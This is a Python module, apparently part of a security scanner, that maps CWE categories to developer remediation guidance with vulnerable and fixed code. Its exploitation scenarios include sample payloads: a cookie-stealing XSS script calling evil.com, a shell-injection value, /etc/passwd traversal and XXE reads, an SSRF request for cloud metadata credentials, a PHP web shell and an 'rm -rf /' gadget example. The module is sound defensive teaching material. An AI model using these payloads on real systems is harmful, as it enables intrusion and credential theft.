# SPDX-FileCopyrightText: 2026 Virantis
# SPDX-License-Identifier: LicenseRef-Vooda-Community-1.0

"""
Developer remediation guidance engine.

Generates vulnerability explanations, exploitation scenarios, secure code fixes,
best practices, and fix-difficulty ratings for each CWE / vulnerability category.
"""

from __future__ import annotations
from typing import Optional


# ================================================================
#  CWE Knowledge Base  (Top vulnerabilities)
# ================================================================

CWE_GUIDANCE: dict[str, dict] = {
    "CWE-89": {
        "title": "SQL Injection",
        "explanation": "User-controlled input is concatenated directly into a SQL query, allowing an attacker to alter the query logic, extract data, modify records, or execute administrative operations on the database.",
        "why_problem": "An attacker can bypass authentication, read/modify/delete any data in the database, and in some cases execute system commands on the database server.",
        "exploitation_scenario": "Attacker enters `' OR 1=1 --` in a login form username field. The resulting query becomes `SELECT * FROM users WHERE username='' OR 1=1 --' AND password='...'`, returning all user records and bypassing authentication.",
        "fix_strategy": "Use parameterised queries (prepared statements) or an ORM. Never concatenate user input into SQL strings.",
        "before_code": "# VULNERABLE\nquery = f\"SELECT * FROM users WHERE name = '{user_input}'\"\ncursor.execute(query)",
        "after_code": "# SECURE -- parameterised query\ncursor.execute(\"SELECT * FROM users WHERE name = %s\", (user_input,))",
        "best_practices": [
            "Use parameterised queries / prepared statements for ALL database queries",
            "Use an ORM (SQLAlchemy, Django ORM, Hibernate) that parameterises by default",
            "Apply input validation and allowlisting on expected formats",
            "Use least-privilege database accounts -- never connect as DBA",
            "Enable WAF SQL injection rules as defense-in-depth",
        ],
        "libraries": {"python": "SQLAlchemy, Django ORM", "java": "JPA / Hibernate, Spring Data", "javascript": "Sequelize, Knex.js (with bindings)", "csharp": "Entity Framework, Dapper (parameterised)"},
        "fix_difficulty": "easy",
        "estimated_fix_minutes": 15,
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/89.html",
        ],
    },
    "CWE-79": {
        "title": "Cross-Site Scripting (XSS)",
        "explanation": "User-controlled input is rendered in a web page without proper encoding, allowing an attacker to inject malicious JavaScript that executes in the context of other users' browsers.",
        "why_problem": "An attacker can steal session cookies, redirect users to phishing sites, deface pages, keylog input, or perform actions on behalf of authenticated users.",
        "exploitation_scenario": "Attacker submits `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` in a comment field. When another user views the page, their session cookie is sent to the attacker.",
        "fix_strategy": "Context-aware output encoding. Use a templating engine with auto-escaping. Implement Content Security Policy (CSP) headers.",
        "before_code": "<!-- VULNERABLE -->\n<div>Welcome, {{ user_input | safe }}</div>",
        "after_code": "<!-- SECURE -- auto-escaped -->\n<div>Welcome, {{ user_input }}</div>\n<!-- Plus CSP header: Content-Security-Policy: default-src 'self' -->",
        "best_practices": [
            "Enable auto-escaping in your template engine (Jinja2, React JSX, Angular)",
            "Use context-aware encoding: HTML, JS, URL, CSS contexts need different encoding",
            "Implement Content Security Policy (CSP) headers",
            "Sanitise rich-text input with a library like DOMPurify or bleach",
            "Never use innerHTML / dangerouslySetInnerHTML with user data",
        ],
        "libraries": {"python": "bleach, MarkupSafe", "javascript": "DOMPurify, sanitize-html", "java": "OWASP Java Encoder", "csharp": "HtmlSanitizer, AntiXSS"},
        "fix_difficulty": "easy",
        "estimated_fix_minutes": 20,
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/79.html",
        ],
    },
    "CWE-78": {
        "title": "OS Command Injection",
        "explanation": "User input is passed directly to a system shell command, allowing an attacker to execute arbitrary commands on the host operating system.",
        "why_problem": "Full server compromise. Attacker can read/write files, install malware, pivot to internal networks, exfiltrate data, or create backdoor accounts.",
        "exploitation_scenario": "Application runs `os.system(f'ping {user_input}')`. Attacker sends `127.0.0.1; cat /etc/passwd` to execute a second command after the ping.",
        "fix_strategy": "Avoid shell commands entirely. Use language-native APIs. If shell is required, use parameterised execution (subprocess with list args) and strict input validation.",
        "before_code": "# VULNERABLE\nimport os\nos.system(f'ping -c 1 {host}')",
        "after_code": "# SECURE -- no shell, list args\nimport subprocess\nsubprocess.run(['ping', '-c', '1', host], capture_output=True, check=True)",
        "best_practices": [
            "Never pass user input to shell commands",
            "Use subprocess with shell=False and list arguments",
            "Use language-native libraries instead of shelling out (e.g., socket for ping)",
            "If unavoidable, use strict allowlist validation on input",
            "Run with least-privilege user accounts",
        ],
        "libraries": {"python": "subprocess (shell=False), shlex.quote", "java": "ProcessBuilder (no shell)", "javascript": "child_process.execFile (not exec)", "csharp": "Process.Start with ArgumentList"},
        "fix_difficulty": "medium",
        "estimated_fix_minutes": 30,
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/78.html",
        ],
    },
    "CWE-22": {
        "title": "Path Traversal",
        "explanation": "User-controlled input is used to construct file paths without proper validation, allowing an attacker to access files outside the intended directory using sequences like `../`.",
        "why_problem": "Attacker can read sensitive files (configuration, credentials, source code) or overwrite critical files to achieve code execution.",
        "exploitation_scenario": "Request to `/download?file=../../../etc/passwd` reads the system password file instead of a document from the uploads directory.",
        "fix_strategy": "Canonicalize paths and verify they remain within the allowed base directory. Use allowlists for filenames where possible.",
        "before_code": "# VULNERABLE\npath = os.path.join(UPLOAD_DIR, user_filename)\nreturn open(path).read()",
        "after_code": "# SECURE\nimport os\npath = os.path.realpath(os.path.join(UPLOAD_DIR, user_filename))\nif not path.startswith(os.path.realpath(UPLOAD_DIR)):\n    raise ValueError('Invalid path')\nreturn open(path).read()",
        "best_practices": [
            "Canonicalize (resolve) paths before use and validate the prefix",
            "Use os.path.realpath() or Path.resolve() to eliminate traversal sequences",
            "Store files with system-generated names; map user names in a database",
            "Implement a chroot or container boundary for file access",
            "Restrict file permissions to the minimum required",
        ],
        "libraries": {"python": "pathlib.Path.resolve(), os.path.realpath", "java": "java.nio.file.Path.toRealPath()", "javascript": "path.resolve() + startsWith check", "csharp": "Path.GetFullPath() + StartsWith check"},
        "fix_difficulty": "easy",
        "estimated_fix_minutes": 15,
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/22.html",
        ],
    },
    "CWE-798": {
        "title": "Hard-coded Credentials",
        "explanation": "Passwords, API keys, or other secrets are embedded directly in source code, making them visible to anyone with access to the code repository.",
        "why_problem": "Credentials in source code are easily discovered through code review, repository leaks, or decompilation. They cannot be rotated without redeploying the application.",
        "exploitation_scenario": "Developer commits `DB_PASSWORD = 'admin123'` to a public GitHub repository. Automated scanners find and exploit the credential within minutes.",
        "fix_strategy": "Use environment variables, secrets management services, or encrypted configuration files. Never commit secrets to version control.",
        "before_code": "# VULNERABLE\nDB_PASSWORD = 'supersecret123'\nAPI_KEY = 'sk-live-abc123xyz'",
        "after_code": "# SECURE\nimport os\nDB_PASSWORD = os.environ['DB_PASSWORD']\nAPI_KEY = os.environ['API_KEY']\n# Or use: AWS Secrets Manager, HashiCorp Vault, Azure Key Vault",
        "best_practices": [
            "Use a secrets management service (Vault, AWS Secrets Manager, Azure Key Vault)",
            "Store secrets in environment variables, not in code or config files",
            "Add .env and credential files to .gitignore",
            "Use pre-commit hooks (e.g., git-secrets, detect-secrets) to block secret commits",
            "Rotate any exposed credentials immediately",
        ],
        "libraries": {"python": "python-dotenv, boto3 (Secrets Manager)", "java": "Spring Vault, AWS SDK", "javascript": "dotenv, @aws-sdk/client-secrets-manager", "csharp": "Azure.Security.KeyVault.Secrets"},
        "fix_difficulty": "easy",
        "estimated_fix_minutes": 20,
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/798.html",
        ],
    },
    "CWE-502": {
        "title": "Deserialization of Untrusted Data",
        "explanation": "The application deserializes data from an untrusted source without validation, potentially allowing an attacker to execute arbitrary code, cause denial of service, or manipulate application logic.",
        "why_problem": "Deserialization attacks can lead to remote code execution (RCE), which is the most severe impact -- full server compromise with a single request.",
        "exploitation_scenario": "Java application uses `ObjectInputStream` to deserialize user-supplied data. Attacker sends a crafted serialized object using a gadget chain (e.g., Commons Collections) to execute `Runtime.exec('rm -rf /')`.",
        "fix_strategy": "Avoid deserializing untrusted data. Use safe data formats (JSON) instead of native serialization. If required, implement strict type allowlisting.",
        "before_code": "# VULNERABLE (Python pickle)\nimport pickle\ndata = pickle.loads(user_data)",
        "after_code": "# SECURE -- use JSON instead\nimport json\ndata = json.loads(user_data)\n# Or use a schema validator: pydantic, marshmallow",
        "best_practices": [
            "Never deserialize untrusted input with native serialization (pickle, Java ObjectInputStream)",
            "Use JSON or Protocol Buffers with schema validation",
            "If native serialization is required, implement strict type allowlisting",
            "Monitor deserialization endpoints for anomalous payloads",
            "Keep libraries updated to patch known gadget chains",
        ],
        "libraries": {"python": "json, pydantic, marshmallow", "java": "Jackson (JSON), notsoserial (agent)", "javascript": "JSON.parse (safe by default)", "csharp": "System.Text.Json, Newtonsoft with TypeNameHandling.None"},
        "fix_difficulty": "medium",
        "estimated_fix_minutes": 45,
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/502.html",
        ],
    },
    "CWE-918": {
        "title": "Server-Side Request Forgery (SSRF)",
        "explanation": "The application makes HTTP requests to a URL controlled by the user without proper validation, allowing an attacker to make requests to internal services, cloud metadata endpoints, or other protected resources.",
        "why_problem": "SSRF can expose internal infrastructure, cloud credentials (via metadata endpoints like 169.254.169.254), internal APIs, and enable pivoting into private networks.",
        "exploitation_scenario": "Application fetches a user-supplied URL for a preview feature. Attacker submits `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to steal AWS IAM credentials.",
        "fix_strategy": "Validate and allowlist destination URLs. Block requests to private IP ranges and cloud metadata endpoints. Use a dedicated egress proxy.",
        "before_code": "# VULNERABLE\nimport requests\nresponse = requests.get(user_url)",
        "after_code": "# SECURE\nfrom urllib.parse import urlparse\nimport ipaddress\n\ndef is_safe_url(url):\n    parsed = urlparse(url)\n    if parsed.scheme not in ('http', 'https'):\n        return False\n    try:\n        ip = ipaddress.ip_address(parsed.hostname)\n        if ip.is_private or ip.is_loopback or ip.is_link_local:\n            return False\n    except ValueError:\n        pass  # hostname, not IP -- DNS may still resolve to private\n    return True\n\nif is_safe_url(user_url):\n    response = requests.get(user_url, timeout=5)",
        "best_practices": [
            "Allowlist permitted domains and URL schemes",
            "Block private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x)",
            "Use a dedicated egress proxy that enforces URL policies",
            "Disable HTTP redirects or re-validate after redirect",
            "Never expose raw response bodies to the user",
        ],
        "libraries": {"python": "urllib.parse, ipaddress", "java": "java.net.URL with InetAddress validation", "javascript": "url.parse, ssrf-req-filter", "csharp": "Uri class with IPAddress validation"},
        "fix_difficulty": "medium",
        "estimated_fix_minutes": 30,
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/918.html",
        ],
    },
    "CWE-352": {
        "title": "Cross-Site Request Forgery (CSRF)",
        "explanation": "The application does not verify that requests come from its own pages, allowing an attacker to trick an authenticated user's browser into submitting forged requests.",
        "why_problem": "Attacker can perform any action the victim user is authorised to do: change passwords, transfer funds, modify settings, delete data.",
        "exploitation_scenario": "Attacker hosts a page with `<img src='https://bank.com/transfer?to=attacker&amount=10000'>`. When a logged-in user visits, their browser sends the request with session cookies, executing the transfer.",
        "fix_strategy": "Implement anti-CSRF tokens (synchroniser pattern) for all state-changing requests. Use SameSite cookie attribute.",
        "before_code": "<!-- VULNERABLE -- no CSRF token -->\n<form action=\"/transfer\" method=\"POST\">\n  <input name=\"amount\" value=\"100\">\n  <button>Send</button>\n</form>",
        "after_code": "<!-- SECURE -- CSRF token -->\n<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"{{ csrf_token }}\">\n  <input name=\"amount\" value=\"100\">\n  <button>Send</button>\n</form>\n<!-- Plus: Set-Cookie: session=...; SameSite=Strict; Secure -->",
        "best_practices": [
            "Use framework-provided CSRF protection (Django, Spring Security, Express csurf)",
            "Set SameSite=Strict or Lax on session cookies",
            "Require re-authentication for sensitive operations",
            "Verify Origin and Referer headers as defense-in-depth",
            "Use custom request headers for AJAX (browsers enforce same-origin policy for custom headers)",
        ],
        "libraries": {"python": "Django CSRF middleware, Flask-WTF", "java": "Spring Security CSRF", "javascript": "csurf (Express), Next.js built-in", "csharp": "AntiForgery middleware"},
        "fix_difficulty": "easy",
        "estimated_fix_minutes": 20,
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/352.html",
        ],
    },
    "CWE-287": {
        "title": "Improper Authentication",
        "explanation": "The application does not properly verify user identity, allowing attackers to bypass authentication mechanisms and gain unauthorized access.",
        "why_problem": "Authentication bypass gives attackers full access to user accounts, administrative functionality, and sensitive data without valid credentials.",
        "exploitation_scenario": "Application checks `if (username == 'admin')` but doesn't verify the password, or accepts a null/empty password. Attacker gains admin access.",
        "fix_strategy": "Use proven authentication frameworks. Implement multi-factor authentication. Enforce strong password policies.",
        "before_code": "# VULNERABLE\ndef authenticate(username, password):\n    user = db.get_user(username)\n    if user and user.password == password:  # plaintext comparison!\n        return True",
        "after_code": "# SECURE\nfrom passlib.hash import bcrypt\n\ndef authenticate(username, password):\n    user = db.get_user(username)\n    if user and bcrypt.verify(password, user.password_hash):\n        return create_session(user)\n    raise AuthenticationError('Invalid credentials')",
        "best_practices": [
            "Use established authentication libraries and frameworks",
            "Hash passwords with bcrypt, scrypt, or Argon2 -- never store plaintext",
            "Implement account lockout after repeated failed attempts",
            "Enable multi-factor authentication (MFA)",
            "Use constant-time comparison for authentication tokens",
        ],
        "libraries": {"python": "passlib, bcrypt, PyJWT", "java": "Spring Security, jBCrypt", "javascript": "bcrypt, passport.js", "csharp": "ASP.NET Identity, BCrypt.Net"},
        "fix_difficulty": "medium",
        "estimated_fix_minutes": 60,
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/287.html",
        ],
    },
    "CWE-326": {
        "title": "Inadequate Encryption Strength",
        "explanation": "The application uses cryptographic algorithms or key sizes that do not provide sufficient security against modern attacks.",
        "why_problem": "Weak encryption can be broken by attackers with modest computational resources, exposing protected data, credentials, and communications.",
        "exploitation_scenario": "Application uses DES (56-bit key) to encrypt sensitive data. An attacker with a modern GPU can brute-force the key in hours.",
        "fix_strategy": "Use modern algorithms with adequate key lengths: AES-256 for symmetric encryption, RSA-2048+ or ECDSA P-256+ for asymmetric, SHA-256+ for hashing.",
        "before_code": "# VULNERABLE\nfrom Crypto.Cipher import DES\ncipher = DES.new(key8bytes, DES.MODE_ECB)",
        "after_code": "# SECURE\nfrom cryptography.fernet import Fernet\nkey = Fernet.generate_key()  # AES-128-CBC under the hood\ncipher = Fernet(key)\ntoken = cipher.encrypt(plaintext)",
        "best_practices": [
            "Use AES-256-GCM for symmetric encryption",
            "Use RSA-2048+ or ECDSA P-256+ for asymmetric operations",
            "Use SHA-256 or SHA-3 for hashing; avoid MD5 and SHA-1",
            "Use Argon2, bcrypt, or scrypt for password hashing",
            "Keep cryptographic libraries updated",
        ],
        "libraries": {"python": "cryptography (Fernet, hazmat), PyNaCl", "java": "Bouncy Castle, JCA (with strong providers)", "javascript": "crypto (Node.js built-in), tweetnacl", "csharp": "System.Security.Cryptography"},
        "fix_difficulty": "medium",
        "estimated_fix_minutes": 45,
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/326.html",
        ],
    },
    "CWE-862": {
        "title": "Missing Authorization",
        "explanation": "The application does not check whether the user is authorized to perform an action or access a resource, allowing any authenticated user to access any data.",
        "why_problem": "Users can access, modify, or delete other users' data. This is one of the most common and impactful web application vulnerabilities (IDOR).",
        "exploitation_scenario": "API endpoint `/api/users/123/profile` returns user 123's data. Attacker changes the ID to `/api/users/456/profile` and accesses another user's private information.",
        "fix_strategy": "Implement authorization checks on every endpoint. Use the current user's session to scope data access. Apply row-level security.",
        "before_code": "# VULNERABLE -- no ownership check\n@app.get('/api/orders/{order_id}')\ndef get_order(order_id: int):\n    return db.query(Order).get(order_id)",
        "after_code": "# SECURE -- scoped to current user\n@app.get('/api/orders/{order_id}')\ndef get_order(order_id: int, user = Depends(get_current_user)):\n    order = db.query(Order).filter(\n        Order.id == order_id,\n        Order.user_id == user.id\n    ).first()\n    if not order:\n        raise HTTPException(404)\n    return order",
        "best_practices": [
            "Always scope queries to the current user's ownership or role",
            "Use middleware or decorators for consistent authorization checks",
            "Implement role-based (RBAC) or attribute-based (ABAC) access control",
            "Use indirect references (UUIDs) instead of sequential IDs",
            "Write authorization unit tests for every endpoint",
        ],
        "libraries": {"python": "FastAPI Depends, Django Guardian, Flask-Principal", "java": "Spring Security @PreAuthorize", "javascript": "CASL, accesscontrol", "csharp": "[Authorize] attribute, Policy-based auth"},
        "fix_difficulty": "medium",
        "estimated_fix_minutes": 30,
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/862.html",
        ],
    },
    "CWE-611": {
        "title": "XML External Entity (XXE) Injection",
        "explanation": "The application parses XML input with external entity processing enabled, allowing an attacker to read local files, perform SSRF, or cause denial of service.",
        "why_problem": "XXE can read any file the application can access (/etc/passwd, configuration files with credentials), make outbound requests to internal services, or cause system crashes.",
        "exploitation_scenario": "Attacker submits XML: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><data>&xxe;</data>`. The parser resolves the entity and includes the file contents in the response.",
        "fix_strategy": "Disable external entity processing and DTDs in XML parsers. Use JSON instead of XML where possible.",
        "before_code": "# VULNERABLE\nimport xml.etree.ElementTree as ET\ntree = ET.parse(user_xml_file)",
        "after_code": "# SECURE -- use defusedxml\nimport defusedxml.ElementTree as ET\ntree = ET.parse(user_xml_file)  # DTDs and entities disabled",
        "best_practices": [
            "Disable DTDs (DOCTYPE declarations) in XML parsers",
            "Disable external entity resolution",
            "Use defusedxml (Python) or equivalent safe parsers",
            "Prefer JSON over XML for API data exchange",
            "Validate XML against a schema (XSD) before processing",
        ],
        "libraries": {"python": "defusedxml", "java": "set XMLConstants.FEATURE_SECURE_PROCESSING", "javascript": "fast-xml-parser (entities disabled)", "csharp": "XmlReaderSettings with DtdProcessing.Prohibit"},
        "fix_difficulty": "easy",
        "estimated_fix_minutes": 15,
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/611.html",
        ],
    },
    "CWE-434": {
        "title": "Unrestricted File Upload",
        "explanation": "The application allows users to upload files without proper validation of file type, content, or storage location, potentially allowing execution of malicious code.",
        "why_problem": "Attacker can upload a web shell (e.g., PHP, JSP) and execute arbitrary code on the server, leading to full system compromise.",
        "exploitation_scenario": "Attacker uploads `shell.php` containing `<?php system($_GET['cmd']); ?>` through an avatar upload form. They then access `https://app.com/uploads/shell.php?cmd=id` to execute commands.",
        "fix_strategy": "Validate file type by content (magic bytes), not just extension. Store uploads outside web root. Use randomised filenames.",
        "before_code": "# VULNERABLE\ndef upload(file):\n    file.save(f'uploads/{file.filename}')",
        "after_code": "# SECURE\nimport uuid, os\nALLOWED = {'.jpg', '.png', '.gif', '.pdf'}\n\ndef upload(file):\n    ext = os.path.splitext(file.filename)[1].lower()\n    if ext not in ALLOWED:\n        raise ValueError('File type not allowed')\n    safe_name = f'{uuid.uuid4()}{ext}'\n    file.save(os.path.join(UPLOAD_DIR, safe_name))  # outside web root",
        "best_practices": [
            "Validate file content type using magic bytes, not just extension",
            "Use an allowlist of permitted file types",
            "Store uploads outside the web root directory",
            "Generate random filenames; never use user-supplied names directly",
            "Scan uploaded files with antivirus/malware detection",
            "Set restrictive Content-Type and Content-Disposition headers when serving files",
        ],
        "libraries": {"python": "python-magic, filetype", "java": "Apache Tika", "javascript": "file-type, multer (with filters)", "csharp": "MimeDetective"},
        "fix_difficulty": "medium",
        "estimated_fix_minutes": 30,
        "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/434.html",
        ],
    },
    "CWE-94": {
        "title": "Code Injection",
        "explanation": "User input is interpreted as code by the application (via eval, exec, or similar), allowing arbitrary code execution.",
        "why_problem": "Code injection provides the attacker with the same capabilities as the application process -- reading/writing files, accessing databases, making network requests, or executing system commands.",
        "exploitation_scenario": "Application uses `eval(user_expr)` for a calculator feature. Attacker submits `__import__('os').system('whoami')` to execute OS commands.",
        "fix_strategy": "Never use eval/exec with user input. Use safe expression parsers or allowlisted operations.",
        "before_code": "# VULNERABLE\nresult = eval(user_expression)",
        "after_code": "# SECURE -- use ast.literal_eval for safe data\nimport ast\nresult = ast.literal_eval(user_expression)  # only parses literals\n# Or use a sandboxed expression library like simpleeval",
        "best_practices": [
            "Never use eval(), exec(), Function(), or similar with user input",
            "Use ast.literal_eval() for parsing Python data literals safely",
            "Use sandboxed expression evaluators for calculator/formula features",
            "Apply strict input validation and allowlisting",
            "Consider a DSL or structured API instead of accepting arbitrary expressions",
        ],
        "libraries": {"python": "ast.literal_eval, simpleeval, RestrictedPython", "java": "Use scripting API with SecurityManager", "javascript": "mathjs (safe-eval mode)", "csharp": "Roslyn scripting with sandboxing"},
        "fix_difficulty": "medium",
        "estimated_fix_minutes": 30,
        "references": [
            "https://cwe.mitre.org/data/definitions/94.html",
        ],
    },
    "CWE-306": {
        "title": "Missing Authentication for Critical Function",
        "explanation": "A critical function or endpoint does not require any authentication, allowing anonymous users to access it.",
        "why_problem": "Unauthenticated access to administrative or sensitive functions can lead to data theft, system manipulation, or complete application takeover.",
        "exploitation_scenario": "Admin API endpoint `/api/admin/users` returns all user records without requiring authentication. Attacker discovers it via API enumeration.",
        "fix_strategy": "Require authentication on all non-public endpoints. Use middleware to enforce authentication globally with explicit opt-out for public routes.",
        "before_code": "# VULNERABLE -- no auth required\n@app.get('/api/admin/users')\ndef list_users():\n    return db.query(User).all()",
        "after_code": "# SECURE\n@app.get('/api/admin/users')\ndef list_users(user = Depends(require_admin)):\n    return db.query(User).all()",
        "best_practices": [
            "Apply authentication middleware globally; explicitly mark public routes",
            "Require strong authentication for administrative functions",
            "Implement defense-in-depth with network-level restrictions for admin endpoints",
            "Audit all routes to verify authentication requirements",
            "Use automated tests that verify unauthenticated access is rejected",
        ],
        "libraries": {"python": "FastAPI Security, Django LoginRequired", "java": "Spring Security", "javascript": "passport.js, express-jwt", "csharp": "[Authorize] attribute"},
        "fix_difficulty": "easy",
        "estimated_fix_minutes": 15,
        "references": [
            "https://cwe.mitre.org/data/definitions/306.html",
        ],
    },
}

# ================================================================
#  Fallback category-based guidance
# ================================================================

_CATEGORY_GUIDANCE: dict[str, dict] = {
    "injection": {
        "title": "Injection Vulnerability",
        "explanation": "User input is included in a command or query without proper sanitization.",
        "fix_strategy": "Use parameterised queries, prepared statements, or safe APIs. Validate and sanitise all user input.",
        "fix_difficulty": "medium",
        "estimated_fix_minutes": 30,
    },
    "authentication": {
        "title": "Authentication Weakness",
        "explanation": "The application has a flaw in its authentication mechanism.",
        "fix_strategy": "Use proven authentication frameworks with secure defaults. Implement MFA.",
        "fix_difficulty": "medium",
        "estimated_fix_minutes": 45,
    },
    "cryptographic": {
        "title": "Cryptographic Weakness",
        "explanation": "The application uses weak or broken cryptographic algorithms.",
        "fix_strategy": "Upgrade to modern algorithms: AES-256, SHA-256+, RSA-2048+.",
        "fix_difficulty": "medium",
        "estimated_fix_minutes": 30,
    },
    "access control": {
        "title": "Access Control Flaw",
        "explanation": "The application does not properly enforce access restrictions.",
        "fix_strategy": "Implement authorization checks on every endpoint. Apply least privilege.",
        "fix_difficulty": "medium",
        "estimated_fix_minutes": 30,
    },
    "information disclosure": {
        "title": "Information Disclosure",
        "explanation": "The application exposes sensitive information to unauthorized actors.",
        "fix_strategy": "Remove sensitive data from responses, logs, and error messages. Implement proper error handling.",
        "fix_difficulty": "easy",
        "estimated_fix_minutes": 15,
    },
}


# ================================================================
#  Public API
# ================================================================

def get_finding_guidance(
    cwe: Optional[str] = None,
    category: str = "",
    severity: str = "medium",
) -> dict:
    """
    Return developer remediation guidance for a finding.

    Returns structured guidance with explanation, exploitation scenario,
    before/after code, best practices, and fix effort estimate.
    """
    cwe_upper = (cwe or "").upper()

    # Try CWE-specific guidance first
    if cwe_upper in CWE_GUIDANCE:
        g = CWE_GUIDANCE[cwe_upper]
        return {
            "cwe": cwe_upper,
            "title": g["title"],
            "explanation": g["explanation"],
            "why_problem": g["why_problem"],
            "exploitation_scenario": g["exploitation_scenario"],
            "fix_strategy": g["fix_strategy"],
            "before_code": g["before_code"],
            "after_code": g["after_code"],
            "best_practices": g["best_practices"],
            "recommended_libraries": g["libraries"],
            "fix_difficulty": g["fix_difficulty"],
            "estimated_fix_minutes": g["estimated_fix_minutes"],
            "references": g["references"],
            "guidance_source": "cwe_specific",
        }

    # Try category-based fallback
    cat_lower = (category or "").lower()
    for cat_key, g in _CATEGORY_GUIDANCE.items():
        if cat_key in cat_lower:
            return {
                "cwe": cwe_upper or None,
                "title": g["title"],
                "explanation": g["explanation"],
                "why_problem": None,
                "exploitation_scenario": None,
                "fix_strategy": g["fix_strategy"],
                "before_code": None,
                "after_code": None,
                "best_practices": None,
                "recommended_libraries": None,
                "fix_difficulty": g["fix_difficulty"],
                "estimated_fix_minutes": g["estimated_fix_minutes"],
                "references": [f"https://cwe.mitre.org/data/definitions/{cwe_upper.replace('CWE-', '')}.html"] if cwe_upper.startswith("CWE-") else [],
                "guidance_source": "category_fallback",
            }

    # Generic fallback
    fix_mins = {"critical": 60, "high": 45, "medium": 30, "low": 15, "info": 10}.get(severity.lower(), 30)
    return {
        "cwe": cwe_upper or None,
        "title": category or "Security Finding",
        "explanation": f"A {severity}-severity security finding was detected." + (f" Classified as {cwe_upper}." if cwe_upper else ""),
        "why_problem": None,
        "exploitation_scenario": None,
        "fix_strategy": "Review the finding details, understand the root cause, and apply the appropriate fix based on the vulnerability type.",
        "before_code": None,
        "after_code": None,
        "best_practices": None,
        "recommended_libraries": None,
        "fix_difficulty": "medium",
        "estimated_fix_minutes": fix_mins,
        "references": [f"https://cwe.mitre.org/data/definitions/{cwe_upper.replace('CWE-', '')}.html"] if cwe_upper.startswith("CWE-") else [],
        "guidance_source": "generic",
    }


def get_fix_difficulty_label(difficulty: str) -> str:
    return {"easy": "Easy (< 30 min)", "medium": "Medium (30-60 min)", "hard": "Hard (1-4 hrs)", "complex": "Complex (4+ hrs)"}.get(difficulty, "Medium")
